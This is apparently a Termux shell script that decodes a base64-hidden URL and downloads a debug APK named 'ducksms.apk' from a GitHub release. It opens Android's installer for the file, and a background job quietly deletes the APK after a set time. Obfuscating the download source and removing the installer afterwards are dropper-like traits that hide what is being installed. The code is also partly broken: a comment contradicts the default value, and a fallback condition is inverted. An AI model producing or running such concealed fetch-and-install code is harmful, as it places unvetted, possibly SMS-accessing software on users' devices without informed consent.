#!/data/data/com.termux/files/usr/bin/bash

# Terminal colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Set how long to keep the APK before automatically deleting (in minutes)
APK_LIFETIME=${1:-15}  # Default to 60 minutes if not specified

echo -e "${CYAN}Starting APK download and installation process...${NC}"

# Ensure required packages are installed
pkg update -y >/dev/null 2>&1
pkg install -y curl >/dev/null 2>&1

# Get the APK URL from the base64 encoded string
APK_URL_ENCODED="aHR0cHM6Ly9naXRodWIuY29tL255cm9zLXNvbGFyaS9zY3JpcHRzL3JlbGVhc2VzL2Rvd25sb2FkL3YxLjAuMC1iZXRhL2FwcC1kZWJ1Zy5hcGs="
APK_URL=$(echo $APK_URL_ENCODED | base64 -d)

# Download location (home directory)
APK_PATH="$HOME/ducksms.apk"

# Download the APK
echo -e "${CYAN}Downloading APK to your home directory...${NC}"
curl -L "$APK_URL" -o "$APK_PATH" || {
    echo -e "${RED}Download failed. Please check your connection.${NC}"
    exit 1
}

echo -e "${GREEN}APK downloaded successfully to $APK_PATH${NC}"

# Set up automatic deletion of the APK after the specified time
(
    sleep $((APK_LIFETIME * 60))
    if [ -f "$APK_PATH" ]; then
        rm "$APK_PATH" >/dev/null 2>&1
        echo -e "${YELLOW}APK automatically removed after $APK_LIFETIME minutes${NC}" >> "$HOME/apk_cleanup.log"
    fi
) >/dev/null 2>&1 &

# Try various installation methods in order of preference
echo -e "${CYAN}Attempting to install APK...${NC}"

# Method 1: Try using Android's package installer via am command
INSTALL_SUCCESS=false
if command -v am >/dev/null 2>&1; then
    echo -e "${CYAN}Attempting installation with Android package installer...${NC}"
    am start -a android.intent.action.VIEW -d "file://$APK_PATH" -t "application/vnd.android.package-archive" >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}Installation started. Please follow on-screen prompts to complete installation.${NC}"
        INSTALL_SUCCESS=true
    fi
fi

# Method 2: Try termux-open if available and Method 1 failed
if [ "$INSTALL_SUCCESS" = false ] && ! pkg install -y termux-api >/dev/null 2>&1; then
    if command -v termux-open >/dev/null 2>&1; then
        echo -e "${CYAN}Attempting installation with termux-open...${NC}"
        termux-open "$APK_PATH"
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}Installation started. Please follow on-screen prompts to complete installation.${NC}"
            INSTALL_SUCCESS=true
        fi
    fi
fi

# Method 3: Fallback to manual instructions if automated methods failed
if [ "$INSTALL_SUCCESS" = false ]; then
    echo -e "${YELLOW}Automatic installation could not be initiated. To install manually:${NC}"
    echo -e "${CYAN}1. Use your Android file manager to navigate to:${NC}"
    echo -e "${CYAN}   $APK_PATH${NC}"
    echo -e "${CYAN}2. Tap the APK file to install it${NC}"
fi

echo -e "${CYAN}Note: The APK will be automatically removed from Termux after $APK_LIFETIME minutes.${NC}"
